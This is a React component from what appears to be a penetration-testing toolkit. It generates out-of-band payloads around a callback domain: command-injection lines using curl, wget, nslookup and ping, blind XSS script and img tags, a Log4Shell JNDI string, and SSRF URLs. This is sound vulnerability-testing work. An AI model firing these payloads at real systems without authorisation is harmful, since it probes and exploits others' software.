// @author: Albert C | @yz9yt | github.com/yz9yt
// components/OobInteractionHelper.tsx
// version 0.1 Beta
import React, { useState } from 'react';
import { SignalIcon, ClipboardDocumentListIcon, PuzzlePieceIcon } from './Icons.tsx';
import { ToolLayout } from './ToolLayout.tsx';

interface Payload {
  name: string;
  value: string;
}

interface PayloadCategory {
  title: string;
  payloads: (domain: string) => Payload[];
}

const payloadCategories: PayloadCategory[] = [
    {
        title: "DNS (General Purpose)",
        payloads: (domain) => [
            { name: "Plain Domain", value: domain },
            { name: "With Subdomain", value: `sub.${domain}` },
        ]
    },
    {
        title: "Command Injection",
        payloads: (domain) => [
            { name: "nslookup", value: `nslookup ${domain}` },
            { name: "dig", value: `dig ${domain}` },
            { name: "ping", value: `ping -c 1 ${domain}` },
            { name: "cURL", value: `curl http://${domain}` },
            { name: "wget", value: `wget http://${domain}` },
        ]
    },
    {
        title: "Blind XSS",
        payloads: (domain) => [
            { name: "Script Src", value: `<script src=//${domain}></script>` },
            { name: "Image Src", value: `<img src=x onerror="document.location='//${domain}'">`},
            { name: "Import", value: `@import '//${domain}';`},
        ]
    },
    {
        title: "Log4Shell (JNDI)",
        payloads: (domain) => [
            { name: "Basic LDAP", value: `\${jndi:ldap://${domain}/a}` },
        ]
    },
    {
        title: "Blind SSRF",
        payloads: (domain) => [
            { name: "HTTP", value: `http://${domain}` },
            { name: "HTTPS", value: `https://${domain}` },
        ]
    },
];

interface GeneratedPayloads {
    title: string;
    payloads: Payload[];
}


export const OobInteractionHelper: React.FC = () => {
    const [domain, setDomain] = useState<string>('your-id.oastify.com');
    const [copiedPayload, setCopiedPayload] = useState<string | null>(null);
    const [generatedPayloads, setGeneratedPayloads] = useState<GeneratedPayloads[] | null>(null);

    const handleCopy = (payloadValue: string) => {
        navigator.clipboard.writeText(payloadValue);
        setCopiedPayload(payloadValue);
        setTimeout(() => setCopiedPayload(null), 2000);
    };

    const handleGenerate = () => {
        const payloads = payloadCategories.map(category => ({
            title: category.title,
            payloads: category.payloads(domain)
        }));
        setGeneratedPayloads(payloads);
    };

    return (
        <ToolLayout
          icon={<SignalIcon className="h-8 w-8 text-cyan-400" />}
          title="OOB Interaction Helper"
          description={<>Generate Out-of-Band (OOB) payloads for blind vulnerabilities. Use services like <a href="https://interact.sh" target="_blank" rel="noopener noreferrer" className="text-purple-400 hover:underline">interact.sh</a> or Burp Collaborator to get a callback domain.</>}
        >
            <div className="max-w-xl mx-auto">
                 <label htmlFor="oob-domain" className="block text-sm font-medium text-text-secondary mb-2">Your Callback Domain</label>
                 <input
                    id="oob-domain"
                    type="text"
                    value={domain}
                    onChange={(e) => setDomain(e.target.value)}
                    placeholder="e.g., your-id.oastify.com"
                    className="w-full p-2 bg-control-bg border-2 border-control-border rounded-lg text-text-primary focus:ring-2 focus:ring-purple-500 focus:border-purple-500 focus:outline-none transition-colors font-mono"
                  />
            </div>

            <div className="mt-6 flex justify-center">
                <button
                    onClick={handleGenerate}
                    disabled={!domain.trim()}
                    className="group relative inline-flex items-center justify-center px-8 py-3 bg-gradient-to-r from-purple-600 to-cyan-500 hover:from-purple-500 hover:to-cyan-400 disabled:from-gray-600 disabled:to-gray-700 text-white font-bold rounded-lg transition-all duration-300 transform hover:scale-105 disabled:scale-100 disabled:cursor-not-allowed shadow-lg shadow-purple-500/20 overflow-hidden"
                    title="Generate OOB payloads based on the domain"
                >
                    <PuzzlePieceIcon className="h-5 w-5 mr-2" />
                    <span className="relative">Generate Payloads</span>
                </button>
            </div>
            
             {generatedPayloads && (
                <div className="mt-8 space-y-6 animate-fade-in">
                    {generatedPayloads.map((category) => (
                        <div key={category.title}>
                            <h4 className="text-lg font-semibold text-cyan-300 mb-3">{category.title}</h4>
                            <div className="space-y-4">
                                {category.payloads.map((payload) => (
                                    <div key={payload.name} className="bg-control-bg/50 p-3 rounded-lg border border-control-border">
                                        <p className="text-sm font-medium text-text-secondary mb-2">{payload.name}</p>
                                        <div className="bg-black/40 p-3 rounded-md font-mono text-sm text-purple-300 relative group">
                                            <pre className="overflow-x-auto"><code>{payload.value}</code></pre>
                                            <button 
                                               onClick={() => handleCopy(payload.value)}
                                               className="absolute top-2 right-2 p-1.5 rounded-md bg-purple-800/50 text-purple-200 opacity-0 group-hover:opacity-100 focus:opacity-100 transition-opacity"
                                               aria-label={`Copy ${payload.name} payload`}
                                               title={`Copy ${payload.name} payload`}
                                            >
                                              {copiedPayload === payload.value ? (
                                                <span className="text-xs font-bold px-1">Copied!</span>
                                              ) : (
                                                <ClipboardDocumentListIcon className="h-5 w-5" />
                                              )}
                                            </button>
                                          </div>
                                    </div>
                                ))}
                            </div>
                        </div>
                    ))}
                </div>
            )}
        </ToolLayout>
    );
};